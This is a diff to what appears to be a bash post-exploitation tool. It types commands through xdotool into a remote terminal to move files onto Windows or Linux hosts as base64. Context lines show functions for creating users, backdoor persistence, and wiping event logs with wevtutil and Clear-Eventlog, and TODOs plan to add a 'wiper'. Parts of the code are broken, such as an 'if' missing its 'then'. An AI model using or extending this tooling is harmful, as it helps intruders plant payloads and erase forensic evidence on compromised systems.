@@ -92,42 +92,77 @@ function MSBuild {
     echo "msbuild"
 }
 
+function OutputRemoteFile {
+    local local_file=$1
+    local remote_file=$2
+    local platform=$3
+    local method=$4
+
+    # TODO: Implement bin2hex method
+    case $method in
+        "" | pwshb64)
+            Base64 $local_file $remote_file $platform "powershell"
+            ;;
+        cmdb64)
+            Base64 $local_file $remote_file $platform "cmd"
+            ;;
+        nixb64)
+            Base64 $local_file $remote_file $platform "unix"
+            ;;
+        copycon)
+            CopyCon $local_file $remote_file $platform
+            ;;
+        *)
+            echo "Invalid File Transfer Technique!" >&2
+            exit 1
+            ;;
+    esac
+}
+
 function Base64 {
     local input=$1
     local output_file=$2
     local platform=$3
+    local terminal=$4
 
     # Check if input is passed as file
     if [ -f "$input" ]
     then
         file=$(base64 -w 0 $input)        
         echo "[*] Transferring file..."
-        if [ $platform = "windows" ]
+        if [[ $platform = "windows" ]]
         then
-        pwsh_base64_file=$(cat <<EOF
+            if [ $terminal = "powershell" ]
+                pwsh_base64_file=$(cat <<EOF
 \$payload = "$file"
 \$decoded = [Convert]::FromBase64String(\$payload)
 [IO.File]::WriteAllBytes("$output_file", \$decoded)
 EOF
 )
-        while IFS= read -r line
-        do
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-        done <<< "$pwsh_base64_file"
-        elif [ $platform = "linux" ]
+                while IFS= read -r line
+                do
+                    xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
+                    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+                done <<< "$pwsh_base64_file"
+            elif [ $terminal = "cmd" ]
+            then
+                # TODO: Implement certutil base64 file transfer
+                echo "Not yet implemented"
+            fi
+        elif [[ $platform = "linux" && $terminal = "unix" ]]
         then
-        while read -r line
-        do
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "echo -n $line | base64 -d > $output_file"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-        done < "$file"
+            while read -r line
+            do
+                xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "echo -n $line | base64 -d > $output_file"
+                xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            done < "$file"
         fi
 
         echo "[+] File transferred!"
     fi
 
     # TODO: Finish the implementation
+
     # When input is string and not a file.
     if [[ ! -f "$input" && -n "$input" ]]
     then
@@ -136,7 +171,7 @@ EOF
 "$input"
 EOF
 )
-        line_count=$(echo "$multiline" | wc -l)
+        count_line=$(echo "$multiline" | wc -l)
     fi
 }
 
@@ -173,27 +208,6 @@ function CopyCon {
 
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
     echo "[+] File transferred!"
-}
-
-function OutputRemoteFile {
-    local local_file=$1
-    local remote_file=$2
-    local platform=$3
-    local method=$4
-
-    # TODO: Implement bin2hex method
-    case $method in
-        "" | base64)
-            Base64 $local_file $remote_file $platform
-            ;;
-        copycon)
-            CopyCon $local_file $remote_file $platform
-            ;;
-        *)
-            echo "Invalid File Transfer Technique!" >&2
-            exit 1
-            ;;
-    esac
 }
 
 function CreateUser {
@@ -342,7 +356,7 @@ function WevUtil {
     then
         Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
     elif [ $mode = "script" ]
-    # TODO: Include the wiper and then transfer it with Base64
+    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
     else
     # TODO: If the mode was invalid display the available options to inform the user
@@ -357,7 +371,7 @@ function WinEvent {
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
     elif [ $mode = "script" ]
-    # TODO: Include the wiper and then transfer it with Base64
+    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
     else
     # TODO: If the mode was invalid display the available options to inform the user
@@ -420,7 +434,7 @@ Options:
                                             default if not specified)
 
     -m, --method <method>                   Specify the file transfer or execution method
-                                            (For file transfer "base64" is set by default if
+                                            (For file transfer "pwshb64" is set by default if
                                             not specified. For command execution method
                                             "none" is set by default if not specified)
 
@@ -564,7 +578,7 @@ function main() {
     # Persistence method
     if [[ -n "$SELECT" && -n "$METHOD" ]]
     then
-        # -s <info | backdoor > -p <windows | linux> -m <persistence_method>
+        # -s <info | backdoor> -p <windows | linux> -m <persistence_method>
         Persistence "$SELECT" "$PLATFORM" "$METHOD"
     fi
 
